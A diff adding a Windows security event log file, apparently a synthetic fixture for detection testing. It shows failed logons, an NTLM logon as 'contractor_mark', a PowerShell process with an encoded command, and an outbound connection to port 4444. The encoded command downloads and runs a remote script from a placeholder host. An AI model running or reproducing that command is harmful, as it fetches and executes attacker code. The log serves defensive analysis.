@@ -1,0 +1,102 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:02:10.000Z" />
+      <EventRecordID>50101</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">administrator</Data>
+      <Data Name="IpAddress">198.51.100.80</Data>
+      <Data Name="IpPort">58100</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">3</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:02:14.000Z" />
+      <EventRecordID>50102</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">administrator</Data>
+      <Data Name="IpAddress">198.51.100.80</Data>
+      <Data Name="IpPort">58102</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">3</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4625</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:02:18.000Z" />
+      <EventRecordID>50103</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">contractor_mark</Data>
+      <Data Name="IpAddress">198.51.100.80</Data>
+      <Data Name="IpPort">58104</Data>
+      <Data Name="Status">0xC000006D</Data>
+      <Data Name="SubStatus">0xC000006A</Data>
+      <Data Name="LogonType">3</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4624</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:02:25.000Z" />
+      <EventRecordID>50104</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="TargetUserName">contractor_mark</Data>
+      <Data Name="IpAddress">198.51.100.80</Data>
+      <Data Name="IpPort">58106</Data>
+      <Data Name="LogonType">3</Data>
+      <Data Name="TargetLogonId">0x4fa99</Data>
+      <Data Name="AuthenticationPackageName">NTLM</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>4688</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:03:00.000Z" />
+      <EventRecordID>50105</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="SubjectUserName">contractor_mark</Data>
+      <Data Name="NewProcessId">0x2210</Data>
+      <Data Name="NewProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="CommandLine">powershell.exe -NoProfile -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADMALgAwAC4AMQAxADMALgA1ADAALwBiAC4AcABzADEAJwApAA==</Data>
+      <Data Name="ParentProcessName">C:\Windows\System32\cmd.exe</Data>
+    </EventData>
+  </Event>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-Security-Auditing" />
+      <EventID>5156</EventID>
+      <TimeCreated SystemTime="2026-10-18T14:03:15.000Z" />
+      <EventRecordID>50106</EventRecordID>
+      <Computer>SRV-FINANCE-01.corp.internal</Computer>
+    </System>
+    <EventData>
+      <Data Name="Application">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
+      <Data Name="SourceAddress">10.0.1.100</Data>
+      <Data Name="DestAddress">203.0.113.50</Data>
+      <Data Name="DestPort">4444</Data>
+      <Data Name="SourcePort">51234</Data>
+    </EventData>
+  </Event>
+</Events>
